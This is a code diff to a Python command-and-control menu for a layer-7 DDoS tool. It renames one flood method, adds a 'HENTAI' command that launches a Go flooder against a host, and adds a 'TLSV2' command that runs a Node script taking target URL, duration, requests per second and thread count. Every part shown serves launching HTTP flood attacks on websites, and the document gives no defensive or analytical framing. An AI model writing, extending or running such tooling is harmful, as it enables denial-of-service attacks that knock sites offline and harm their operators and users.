@@ -59,11 +59,12 @@ def layer7():
 \033[96m              ╚╦════════════════════════════════════════════╦╝
 \033[96m         ╔═════╩════════════════════════════════════════════╩═════╗
 \033[95m           - CRASH [\033[92mURL\033[95m] [\033[92mGET\033[95m]
-\033[95m           - TLSV2 [\033[92mURL\033[95m] [\033[92mGET\033[95m]
+\033[95m           - FXX [\033[92mURL\033[95m] [\033[92mGET\033[95m]
 \033[95m           - TLS   [\033[92mURL\033[95m] [\033[92mTIME\033[95m] [\033[92mRATE\033[95m] [\033[92mTHREAD\033[95m]
 \033[95m           - BYPASS [\033[92mURL\033[95m] [\033[92mTHREAD\033[95m] [\033[92mTIME\033[95m]
 \033[95m           - BOMB [\033[92mURL\033[95m] [\033[92mTHREAD\033[95m] [\033[92mTIME\033[95m]
 \033[95m           - MIX [\033[92mURL\033[95m] [\033[92mTIME\033[95m] [\033[92mRPS\033[95m] [\033[92mTHREADS\033[95m]
+\033[95m           - TLSV2 [\033[92mURL\033[95m] [\033[92mTIME\033[95m] [\033[92mRPS\033[95m] [\033[92mTHREAD\033[95m]
 \033[96m         ╚════════════════════════════════════════════════════════╝
 
 ''')
@@ -170,6 +171,15 @@ def main():
                 print('Example: CRASH http://example.com GET')
                 print('\n')
 
+        elif "HENTAI" in cnc:
+            try:
+                url = cnc.split()[1]
+                time = cnc.split()[2]
+                ascii_vro()
+                os.system(f'go run hentai.go -host {url} -time {time}')
+            except IndexError:
+                print('Usage: HENTAI <url> <time>')
+
         elif "BYPASS" in cnc:
             try:
                 url = cnc.split()[1]
@@ -192,15 +202,26 @@ def main():
                 print('Example: MIX http://example.com 244 5 150')
                 print('\n')
 
-        elif "TLSV2" in cnc:
+        elif "FXX" in cnc:
             try:
                 url = cnc.split()[1]
                 method = cnc.split()[2]
                 os.system(f'go run tlsv2.go -site {url} -data {method}')
             except IndexError:
                 print('\n')
-                print('Usage: TLSV2 <url> METHODS<GET/POST>')
-                print('Example: TLSV2 http://example.com GET')
+                print('Usage: FXX <url> METHODS<GET/POST>')
+                print('Example: FXX http://example.com GET')
+
+        elif "TLSV2" in cnc:
+            try:
+                url = cnc.split()[1]
+                time = cnc.split()[2]
+                rps = cnc.split()[3]
+                thread = cnc.split()[4]
+                ascii_vro()
+                os.system(f'node TLS-V2.js {url} {time} {rps} {thread}')
+            except IndexError:
+                print('Usage: TLS-V2 <url> <time> <rps> <thread>')
                 print('\n')
                 
         elif "BOMB" in cnc:
